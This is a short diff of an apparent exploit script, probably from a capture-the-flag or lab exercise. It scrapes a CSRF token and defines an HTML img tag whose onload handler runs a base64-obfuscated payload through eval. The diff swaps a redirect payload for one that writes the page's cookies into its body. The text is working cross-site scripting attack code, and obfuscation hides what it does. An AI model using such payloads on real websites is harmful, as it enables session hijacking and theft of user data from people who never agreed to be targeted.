@@ -23,7 +23,7 @@ csrf_token = new_page_text.split('"csrf_token" value="')[1].split('"')[0]
 eploit = '''
 <img
 src="https://image.shutterstock.com/image-vector/example-signlabel-features-speech-bubble-260nw-1223219848.jpg"
-onload="eval(atob('d2luZG93Lmx' + 'vY2F0aW9uLnJlcG' + 'xhY2UoJ2h0dHA6Ly93ZWIvcGFnZS5waHA/aWQ9MScp'))"
+onload="eval(atob('JCgnYm9keScpLmh0bWwoZG9jdW1lbnQu' + 'Y29va2llKTs='))"
 >
 '''
 
